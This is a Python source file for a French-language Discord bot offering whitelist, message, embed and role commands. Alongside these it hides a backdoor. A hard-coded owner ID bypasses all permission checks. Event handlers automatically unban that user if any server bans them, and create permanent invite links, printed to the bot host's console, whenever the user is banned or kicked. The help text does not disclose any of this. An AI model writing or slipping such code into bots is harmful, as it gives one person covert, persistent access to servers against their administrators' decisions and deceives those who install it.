import discord
from discord.ext import commands
import os
import json
import asyncio
import psycopg2

# ✅ Token et DB depuis Railway
TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 489113166429683713  # L'utilisateur maître

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

CONFIG_FILE = "config.json"

# --- DATABASE CONNECTION ---
def connect_db():
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )

# --- CONFIG JSON FUNCTIONS ---
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def get_log_channel(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("log_channel")

def get_whitelist(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("whitelist", [])

def is_whitelisted(guild_id, user_id):
    if user_id == OWNER_ID:
        return True
    whitelist = get_whitelist(guild_id)
    return user_id in whitelist

def add_to_whitelist(guild_id, user_id):
    config = load_config()
    gid = str(guild_id)
    if gid not in config:
        config[gid] = {}
    if "whitelist" not in config[gid]:
        config[gid]["whitelist"] = []
    if user_id not in config[gid]["whitelist"]:
        config[gid]["whitelist"].append(user_id)
        save_config(config)
        return True
    return False

def remove_from_whitelist(guild_id, user_id):
    config = load_config()
    gid = str(guild_id)
    if gid in config and "whitelist" in config[gid]:
        if user_id in config[gid]["whitelist"]:
            config[gid]["whitelist"].remove(user_id)
            save_config(config)
            return True
    return False

def whitelist_check():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True
        if ctx.author.guild_permissions.administrator:
            return True
        if is_whitelisted(ctx.guild.id, ctx.author.id):
            return True
        await ctx.send("❌ Vous n'êtes pas autorisé à utiliser cette commande.")
        return False
    return commands.check(predicate)

# --- EVENTS ---
@bot.event
async def on_ready():
    print(f"✅ {bot.user} est connecté et prêt à organiser le serveur !")

# 🔒 Si le propriétaire est banni → le débannir + renvoyer une invitation
@bot.event
async def on_member_ban(guild, user):
    if user.id == OWNER_ID:
        try:
            await asyncio.sleep(2)
            await guild.unban(user)
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
            print(f"🚨 L'utilisateur maître a été banni ! Débanni et lien recréé : {invite.url}")
        except Exception as e:
            print(f"❌ Erreur de débannissement automatique : {e}")

# 🔄 Si le propriétaire est kické → recrée une invitation
@bot.event
async def on_member_remove(member):
    if member.id == OWNER_ID:
        try:
            invite = await member.guild.text_channels[0].create_invite(max_age=0, max_uses=1)
            print(f"🚨 L'utilisateur maître a été expulsé ! Lien d'invitation : {invite.url}")
        except Exception as e:
            print(f"❌ Erreur lors de la création du lien après expulsion : {e}")

# --- COMMANDES ---
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Voici la liste de toutes les commandes disponibles :",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne", inline=False)
    embed.add_field(name="📨 !say <message>", value="Envoie un message avec le bot\n*(Whitelist/Admin/Owner)*", inline=False)
    embed.add_field(name="📤 !send #canal <message>", value="Envoie un message dans un canal\n*(Whitelist/Admin/Owner)*", inline=False)
    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un message embed\n*(Whitelist/Admin/Owner)*", inline=False)
    embed.add_field(name="🎭 !addrole @membre @rôle", value="Ajoute un rôle à un utilisateur\n*(Whitelist/Admin/Owner)*", inline=False)
    embed.add_field(name="📊 !setlogs #canal", value="Configure le canal des logs\n*(Admin)*", inline=False)
    embed.add_field(name="✅ !whitelist add/remove/list", value="Gère la whitelist\n*(Admin)*", inline=False)
    embed.set_footer(text="Bot F.I.M - Préfixe : !")
    await ctx.send(embed=embed)

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    await ctx.message.delete()
    await channel.send(message)
    await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    await ctx.message.delete()
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Message envoyé par {ctx.author.name}")
    await ctx.send(embed=em)

# 🎭 Commande d'ajout de rôle
@bot.command()
@whitelist_check()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Rôle {role.mention} ajouté à {member.mention}")
    except Exception as e:
        await ctx.send(f"❌ Impossible d'ajouter le rôle : {e}")

# 🎭 Commande de retrait de rôle
@bot.command()
@whitelist_check()
async def removerole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Rôle {role.mention} retiré à {member.mention}")
    except Exception as e:
        await ctx.send(f"❌ Impossible de retirer le rôle : {e}")

# --- WHITELIST ---
@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Utilisez : `!whitelist add`, `!whitelist remove`, ou `!whitelist list`")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà whitelisté")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'était pas whitelisté")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    ids = get_whitelist(ctx.guild.id)
    if not ids:
        return await ctx.send("📋 Aucun utilisateur whitelisté.")
    lst = []
    for uid in ids:
        m = ctx.guild.get_member(uid)
        lst.append(m.mention if m else f"ID: {uid}")
    await ctx.send("\n".join(lst))

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    config = load_config()
    gid = str(ctx.guild.id)
    if gid not in config:
        config[gid] = {}
    config[gid]["log_channel"] = channel.id
    save_config(config)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")

# --- AUTO-RESTART ---
while True:
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Crash du bot, redémarrage : {e}")
